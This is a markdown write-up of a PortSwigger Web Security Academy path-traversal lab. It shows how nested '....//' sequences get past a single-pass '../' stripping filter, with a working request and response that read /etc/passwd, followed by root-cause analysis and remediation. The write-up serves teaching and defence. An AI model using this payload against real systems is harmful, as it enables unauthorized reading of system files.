# Lab 03 — Traversal Sequences Stripped Non-Recursively

[![Category](https://img.shields.io/badge/Category-Path%20Traversal-purple)]()
[![Type](https://img.shields.io/badge/Type-Path%20Traversal%20-%20Non-Recursive%20Sanitization%20Bypass-orange)]()
[![Severity](https://img.shields.io/badge/Severity-High-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/file-path-traversal)

> Part of the [Path Traversal Labs](./README.md) series — PortSwigger Web Security Academy.

---

## 1. Overview

| Field | Detail |
|---|---|
| **Lab Name** | Traversal Sequences Stripped Non-Recursively |
| **Vulnerability Class** | Path Traversal — Non-Recursive Sanitization Bypass |
| **Weakness (CWE)** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| **Severity** | High |
| **Objective** | Bypass a single-pass string-replace filter using nested traversal sequences that reassemble after stripping. |

## 2. Summary

The server removes `../` occurrences using a non-recursive string replacement (a single pass over the input). Supplying a nested sequence like `....//` causes the inner `../` to be stripped, leaving the outer characters to collapse back into a valid `../` sequence.

## 3. Proof of Concept (PoC)

**Step 1 — Capture the image request:**  
Intercept a normal image request, e.g. `GET /image?filename=25.jpg`.

**Step 2 — Confirm standard payloads fail:**  
Both `../../../etc/passwd` (stripped to `etc/passwd`, resulting in a 404) and `/etc/passwd` (joined inside the image folder) fail.

**Step 3 — Inject nested sequences:**  
Replace every `../` with the nested form `....//`:

```http
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
```

**Step 4 — Observe the collapse and confirm:**  
The filter removes the inner `../` from each `....//` token, leaving `../` behind — three times — reconstructing `../../../etc/passwd` before the file read occurs.


## 4. Evidence (Request / Response)

```http
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
Host: <lab-id>.web-security-academy.net

HTTP/1.1 200 OK
...
root:x:0:0:root:/root:/bin/bash
...
```

## 5. Root Cause Analysis

The sanitization routine (e.g. `input.replace("../", "")`) performs a single, non-recursive pass over the string. It does not re-scan the result after stripping, so a carefully nested payload that only becomes a traversal sequence *after* one removal slips through undetected.

### Attacker vs. Defender Perspective

- **Attacker view:** When a filter seems to strip ../ but still fails, try nested sequences like ....// that reassemble into ../ after a single strip pass.
- **Defender view:** Never sanitize by single-pass stripping; reject on detection instead of cleaning, or loop the strip until output stabilizes.

## 6. Impact

Demonstrates that naive string-stripping sanitization is fundamentally unreliable — any sanitizer that doesn't re-validate its own output in a loop (or reject on any detection rather than silently stripping) can be bypassed this way, leading to the same arbitrary file read impact.

## 7. Remediation

- Never sanitize by stripping malicious substrings; reject the entire request outright if any disallowed sequence is detected (fail closed, not silently clean).
- If stripping must be used, apply it in a loop until the output stabilizes (no further changes occur) — though an allow-list approach is strongly preferred over blacklisting.
- Always perform the canonical-path-containment check as the final, authoritative layer of defense regardless of what pre-filtering was applied.

## 8. References

- [PortSwigger — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)

---

*Writeup produced for educational and authorized lab purposes only (PortSwigger Web Security Academy environment).*
